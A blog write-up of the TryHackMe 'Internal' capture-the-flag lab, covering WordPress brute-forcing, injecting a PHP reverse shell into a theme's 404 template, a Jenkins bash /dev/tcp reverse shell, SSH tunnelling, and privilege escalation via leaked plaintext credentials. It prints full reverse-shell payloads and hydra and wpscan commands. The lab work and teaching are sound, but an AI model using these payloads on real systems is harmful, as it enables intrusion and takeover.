# Internal - THM Room

This is another writeup, this time for TryhackMe's 'Internal' room that is part of the Offensive Pentesting path. This is a writeup detailing all my process to root this room, flaws and all. I embrace mistakes and try to learn from them, therefore this post also includes my failed attempts. You have been warned :)

Leave a comment, leave your feedback or suggestions. It's all welcome, Have a great day!

Enjoy!

- Please visit This room on TryHackMe by [clicking this link](https://tryhackme.com/room/internal).
- **PLEASE NOTE:** Passwords, flag values, or any kind of answers to the room questions were intentionally masked as required by THM writeups rules. The write-up follows my step by step solution to this box, errors, and all. They are usually long :laughing:

PS: I been really busy at work these past days and seems to it'll be the same for the next few weeks. That being said, I still owe you (me? yep) the pentesting report for the last room we solved called [Relevant](https://www.tzero86bits.tk/posts/relevant/). I'd like to also work on the report for this one, so in all fairness I'll owe you two. Will try to get those done relatively soon. I promise. :smile:

## Stage 1 - Pre-engagement Interactions

> "One over-looked step to penetration testing is pre-engagement interactions or scoping. During this pre-phase, a penetration testing company will outline the logistics of the test, expectations, legal implications, objectives and goals the customer would like to achieve."


The client requests that an engineer conducts an external, web app, and internal assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:

  - User.txt
  - Root.txt

Additionally, the client has provided the following scope allowances:

  - Ensure that you modify your `hosts` file to reflect `internal.thm`
  - Any tools or techniques are permitted in this engagement
  - Locate and note all vulnerabilities found
  - Submit the flags discovered to the dashboard
  - Only the IP address assigned to your machine is in scope

## Stage 2 - Reconnaissance

> "Reconnaissance or Open Source Intelligence (OSINT) gathering is an important first step in penetration testing. A pentester works on gathering as much intelligence on your organization and the potential targets for exploit." _from [Cipher.com](https://cipher.com/blog/a-complete-guide-to-the-phases-of-penetration-testing/)_


We need to make sure we update our `hosts` file with the domain for this target machine. For that we simply run nano as sudo and update the file as follows:

![We update the hosts file](https://i.imgur.com/WRwyePT.png)

And to verify we are good to go we perform a `ping` on `internal.thm`:

```sh
┌──(kali㉿kali)-[~]
└─$ ping internal.thm
PING internal.thm (10.10.254.102) 56(84) bytes of data.
64 bytes from internal.thm (10.10.254.102): icmp_seq=1 ttl=61 time=365 ms
64 bytes from internal.thm (10.10.254.102): icmp_seq=2 ttl=61 time=365 ms
64 bytes from internal.thm (10.10.254.102): icmp_seq=3 ttl=61 time=364 ms

```
We are good to go.


Let's run some scans. I'm gonna try `autorecon` and leave it running in the background while I continue with some other manual scans.

While that's running let's see if the machine has anything on port `80` being served for us:

![Default apache2 page on port 80](https://i.imgur.com/KaR0bj4.png)

That's a good piece of information. Let's move on.

If we check the `nmap quick` scan results from the ongoing `autorecon` scan, we see there is a port `22` open as well. This port is running `OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)` and we also get public key back:

![nmap quick results](https://i.imgur.com/rD5ZPzS.png)

Notice the nice folder structure generated by `autorecon`, all the information is organized into folders and there is even a folder to save the exploits you find or create for the target. In this case we can see the `scans` folder which contains the logs or reports of all the tools that are being triggered by `autorecon`, including the `nmap quick` scan that revealed the ssh service running on port `22`.

Let's take a look at what `gobuster` has found:

![Gobuster results](https://i.imgur.com/Rz8GETM.png)

I see some interesting directories here: `/blog`, `/phpmyadmin` and `/wordpress`. This is good information that we can use later on to try and find some vulnerabilities to get a foothold on this machine.

If we look at `/blog` we get this: 

![there is a blog](https://i.imgur.com/2AzqzEl.png)

With this we can say for sure, there is an active blog that runs `wordpress` as CMS. If we try to see the author of the only post published, we get a possible username: `admin`:

![Possible username](https://i.imgur.com/fgj9m77.png)


If try to access wordpress' default location for the admin panel `/wp-admin` we do get a login form:

![Admin panel at default location](https://i.imgur.com/834IhbN.png)

This is good as we could potentially try to hack our way in later on.
Let's look into `whatweb` results logged by `autorecon` to the `scans` folder.

There is not much to it, but we do get a specific version for the Apache server running: `Summary   : Apache[2.4.29], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)`.

`Nikto` scan did not throw much information that we didn't already know or even guessed at this point:

![nikto results](https://i.imgur.com/Qhhmh2b.png)

Let's take a look at that `/phpmyadmin`:

![PHPmyadmin login panel](https://i.imgur.com/9FIDR5Q.png)

We do get a login form. Interesting.

Lastly if we look at what's being served at `/wordpress` we get this:

![We get a normal wordpress empty page](https://i.imgur.com/pvLdvBw.png)

Let's see what results we get from nmap `UDP` scan:

![nmap UDP results](https://i.imgur.com/2egOwcg.png)

I see a couple of opened filtered ports there and not much more honestly. Since we know there is a wordpress blog there, we can run a `wpscan` to see if we could get some details on that wordpress install.

It is required now to obtain a free `wpvulndb API key` to get possible vulnerabilities details, check how to get your key [here](https://wpvulndb.com/api).

The most interesting thing about this is this line here `XML-RPC seems to be enabled`. This could lead give us a potential exploitation.

I'm gonna get some sleep, it's really late and work has been super tyring these days. We'll pick it up tomorrow. (yep, I talk to myself a lot.)




## Stage 3 - Threat Modeling & Vulnerability Identification

> "During the threat modeling and vulnerability identification phase, the tester identifies targets and maps the attack vectors. Any information gathered during the Reconnaissance phase is used to inform the method of attack during the penetration test." _from [Cipher.com](https://cipher.com/blog/a-complete-guide-to-the-phases-of-penetration-testing/)_


### Wordpress Login - Bruteforce


We have a possible username for wordpress called `admin`, we can try to attempt some brutefocing with `wpscan` to see if we manage to get past wordpress login form.

We fire up `wpscan` like this:

`wpscan --url internal.thm/blog/ --passwords rockyou.txt --usernames admin`

After a while we get something back:

```sh

 | Username: admin, Password: my2boys
```
if we try to log into wordpress admin panel with those credentials, we do get access:

![we get access wordpress admin panel](https://i.imgur.com/LWGrDUt.png)

If we look at the blog now that we are logged in we see one private post that smells like a decoy:

![Private post](https://i.imgur.com/5tIWgvM.png)

We'll have that in mind. Anyways, from here on we can potentially try to gain access in a couple of ways, the one I'm familiar is with trying to upload/modify a certain file that can give us a reverse shell connection. Let's see if we can manage to do that.

> At this point another piece of information from the `wpscan` results came to my attention. There was a mention of an outdated theme. I know there are theme vulnerabilities out there, that could be another way in. We'll have that in mind.

We'll try to get a one-liner php reverse shell to run inside one of the php pages that wordpress runs.

First we prepare our reverse shell: `php -r '$sock=fsockopen(getenv("10.13.0.34"),getenv("2112"));exec("/bin/sh -i <&3 >&3 2>&3");'`

We'll use our lucky port `2112`. Now we need to see where we can inject this code to make it run.

> Remember to start `nc -nlvp 2112`.

Ideally we need to locate a file that gets loaded by wordpress by default or we could also try to inject the code into one of the files that gets loaded by the theme that's currently set as active. Let's try this one first since wodpress provides a nice way of editing the active theme files directly in the admin panel.

![We locate our target wordpress theme file](https://i.imgur.com/2NUlDOa.png)

If we look at the available theme files, we see one called `Main Index Template index.php`. Let's pick that one to host our payload. We just add our one-liner reverse shell inside the `<?php ----file content---- ?>` tags:

![we inject our payload](https://i.imgur.com/ra3nAiu.png)

Then we just click `Update File` button. And we should get confirmation the file was updated successfully:

![file updated successfully](https://i.imgur.com/Dts1PvS.png)

This alone won't give us a connection, we now need to find a way to trigger that file. Since the file we choose its a critical part of the theme we might just get what we need by just refreshing the page as a guest:

![We are not lucky](https://i.imgur.com/0quoiJq.png)

That does not seem to work

Since it is just failing to load the page at all, I think the payload could be bad. Let's try again but this time with this payload from Rapid7:

```php
/*<?php /**/ error_reporting(0); $ip = '10.13.0.34'; $port = 2112; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
```

Even though I am getting an initial connection, it closes right up.

```sh
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 2112
listening on [any] 2112 ...
connect to [10.13.0.34] from (UNKNOWN) [10.10.217.146] 38492
```

There is another exploit we can try, this time from `pentestmonkeys` I've used several exploits from that site before. You can find this particular one [here](http://pentestmonkey.net/tools/web-shells/php-reverse-shell).

We just need to update IP and PORT, paste the exploit at the end of the `404 template file` and then call a non-existing blog post URL to trigger it. This time we do get our reverse shell:

![reverse Shell](https://i.imgur.com/iEKyBN0.png)

### XML-RPC

> XML-RPC is an API that warps the information or data into XML file and sends it to the mobile app or remote software. This was introduced as in the olden days, internet speed is not fast, instead of writing it online. Users writes their content offline and publish all together using the API. As the internet services improved, most of us does not use the feature anymore, often it was forgotten by us. _from [Cipher.com](hhttps://bsderek.home.blog/2020/01/06/exploiting-the-xmlrpc-php/)_


Let's start with the possible attacks against `XML-RPC enabled` in the installed Wordpress version.

The idea here is simple at least for this first attempt, we'll create a simple `XML` file that will ping back to us

```xml
<?xml version="1.0" encoding="iso-8859-1"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
 <param>
  <value>
   <string>http://10.13.0.34:8080</string>
  </value>
 </param>
 <param>
  <value>
   <string>http://internal.thm/blog/index.php/2020/08/03/hello-world/</string>
  </value>
 </param>
</params>
</methodCall>
```
We save this file as `pingback.xml`. Then we just need two more things. First, we need to launch an `nc -nlvp 8080` to start listening. Second, we need to execute this attack by running:

`curl -X POST -d @pingback.xml http://internal.thm/blog/xmlrpc.php`

Sadly this approach does not seem to work as I get:

```sh
┌──(kali㉿kali)-[~/Documents/THM/internal]
└─$ curl -X POST -d @pingback.xml http://internal.thm/blog/xmlrpc.php
<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <fault>
    <value>
      <struct>
        <member>
          <name>faultCode</name>
          <value><int>0</int></value>
        </member>
        <member>
          <name>faultString</name>
          <value><string></string></value>
        </member>
      </struct>
    </value>
  </fault>
</methodResponse>
```

This seems like a dead end.

## Stage 4 - Exploitation

> "With a map of all possible vulnerabilities and entry points, the pentester begins to test the exploits found within your network, applications, and data. The goal is for the ethical hacker is to see exactly how far they can get into your environment, identify high-value targets, and avoid any detection." _from [Cipher.com](https://cipher.com/blog/a-complete-guide-to-the-phases-of-penetration-testing/)_


We now have our initial foothold on the server, we managed to get a reverse shell connection by:
1. Bruteforcing our way into Wordpress admin panel.
2. Finding a good php reverse shell script.
3. Injecting the script in a theme file that we could access, in this case the 404 template page.
4. We saved the changes to the theme file and browsed to a URL for post that does not exist.
5. That causes the theme to load the 404 template and execute our exploit.
6. We have `www-data` user access now.

We need to find a way to escalate privileges, since we can't do much with the current access level. Let's fire up a local HTTP server for our friend `linPEAS` to see if we can do some recon:

![we upload linpeas](https://i.imgur.com/8ggoE4p.png)

yay! we don't have permissions to run `sh`...

Ok let's do some manual browsing then. After a while of browsin the various folders we can access, there is one location that contains a `config-db.php` file with some information:

![config-db file](https://i.imgur.com/sUarihU.png)

we get some credentials for `phpmyadmin`:

`
$dbuser='phpmyadmin';
$dbpass='B2Ud4fEOZmVq';
$basepath='';
$dbname='phpmyadmin';
$dbserver='localhost';
$dbport='3306';
$dbtype='mysql';
`

Let's see if maybe we can log into `/phpmyadmin` with those credentials:

![we access phpmyadmin](https://i.imgur.com/qcPcfqP.png)


Let's continue searching for any other interesting files. At the `opt` directory there is a file that gives us another set of credentials. This time for `aubreanna` which was a user folder we could not access when browsing around. we also got a mention of someone called `Bill`.

![we got more credentials](https://i.imgur.com/pZ9foU1.png)

`Bill aubreanna:bubb13guM!@#123`

We know the first set of credentials are for the phpmyadmin panel. Could the second set be for SSH login? let's find out:

![we get access with aubreanna's credentials](https://i.imgur.com/lQvK8Uo.png)

![](https://motherboard-images.vice.com/content-images/contentimage/25533/1441923229850959.gif)

_We are in! (excuse the cinema cliche)_

Let's see if we can find that user flag today. Turns out it was right there in the base directory:

![we got the user flag](https://i.imgur.com/9v6kaOQ.png)

There is also another file called `jenkins.txt` that lets us know about a service running:

```sh
aubreanna@internal:~$ cat jenkins.txt
Internal Jenkins service is running on 172.17.0.2:8080
```
We try uploading `linpeas.sh` again run a `chmod +x linpeas.sh`, and run `linpeas.sh`. This time it runs fine, let's wait and see what it finds. _Spoiler: It did not find much, at least nothing obvious._

Let's see if we can connect to that jenkins service, we need to do some local port forwarding with ssh:

![shh tunel](https://i.imgur.com/YO4bkNz.png)

That worked. Now we should be able to open `localhost:8080` in our machine and hopefully have access to that jenkins:

![jenkins login](https://i.imgur.com/9C1TJe5.png)

And we do get the login for jenkins admin panel. Now we need to somehow get us access to the jenkins panel. 
We could try to bruteforce our way in. Let's see if we attempt a login with `admin:test` as credentials so we can look a bit more into the request that gets triggered:

We do seem to have pretty much all we need to run a bruteforce job with `hydra`:

`sudo hydra -s 8080 127.0.1 http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:Invalid username or password" -l admin -P /usr/share/wordlists/rockyou.txt`

Let's see if we can run that, after a while we get lucky:

let's log into jenkins now:

In jenkins there are some various ways we can try to get a shell, if you happen to have seen my writeup on 'alfred' THM box. You'll know that one of those ways is to modify any existing job running on the server or like this case, create a new job that we can use to trigger a shell. Once we have our job created in jenkins we scroll down to the "build" commands section, and add "execute shell" command block. You should get something like this:

![we create a new jenkins job](https://i.imgur.com/esFRWam.png)


Inside that `Execute shell` text box, we'll add a reverse shell connection script. We'll try with a bash reverse shell:

`bash -c 'exec bash -i &>/dev/tcp/10.13.0.34/2112 <&1'` we simply paste this into the `command` text field int he `execute shell` block. Once done we simply click save to apply the changes.

> Remember to `nc -nlvp 2112`

Now we just need to go back to the jenkins dashboard and we should see a new job listed for which we can now trigger a new build. Let'ts do that:

![jenkins job ready](https://i.imgur.com/VMhhnWT.png)

Once the job runs we should get the reverse shell connection, assuming all goes well:

Now that we got access we need to do a bit of browsing to see what we could find:

After browsing for a while, we can locate an interesting file under the `opt` directory, which reveals the `root` user credentials: `root:tr0ub13guM!@#123`

![we got root credentials](https://i.imgur.com/9YQUL8G.png)

We can probably try to ssh as root to see if we verify these credentials are legit:

![we did it, we got the root flag](https://i.imgur.com/0SeT7nY.png)


We did it, we got root access and we got the last flag. This was a really good box, I had a great time with it. I hope you, whomever you might be that reads this, have also enjoyed this lab.
